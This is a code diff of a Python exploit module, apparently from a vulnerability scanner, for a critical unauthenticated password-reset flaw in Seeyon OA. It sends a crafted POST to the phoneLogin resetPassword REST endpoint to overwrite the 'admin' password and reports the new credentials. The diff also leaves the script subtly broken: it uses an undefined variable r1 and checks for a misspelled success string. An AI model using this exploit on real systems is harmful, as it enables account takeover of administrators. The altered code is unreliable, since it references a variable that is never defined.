@@ -12,7 +12,7 @@ def msg():
 
       'method'    :   'post',
 
-      'bugname'   :   '致远OA 前台任意用户密码修改',
+      'bugname'   :   '致远OA 前台任意用户密码修改',#需要真实存在的用户
 
       'level'     :   'critical',
 
@@ -32,21 +32,24 @@ def randomLowercase(n):#返回特定长度的随机小写字母
   lowercase = ''.join(lst)
   return lowercase
 def run(url,ua):
+  # r0 = randomLowercase(6)
   r0 = randomLowercase(10)
   ret = msg()
   headers = {
       'User-Agent': ua,
       'Content-Type': 'application/json',
+      'Accept-Encoding': 'gzip',
       }
   target = '/seeyon/rest/phoneLogin/phoneCode/resetPassword'
-  data = '{'+f'"loginName":"admin","password":"{r0}'+'"}'
+  data = '{'+f'"loginName":"admin","password":"{r1}'+'"}'
   url1 = url + target
   ret['url'] = url1
   try:
     res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
     # print(res.text)
-    if re.search(r'code.*?message.*?密码强度太弱',res.text,re.S):
-      ret['huixian'] = f'密码修改成功，请使用：{data}登录系统'
+    # if re.search(r'code.*?message.*?密码强度太弱',res.text,re.S):
+    if 'code' in res.text and 'message' in res.text and 'sucess' in res.text:
+      ret['huixian'] = f'账号：admin,密码：{r1}'
       ret['ifbug'] = True
       res.close()
       return ret
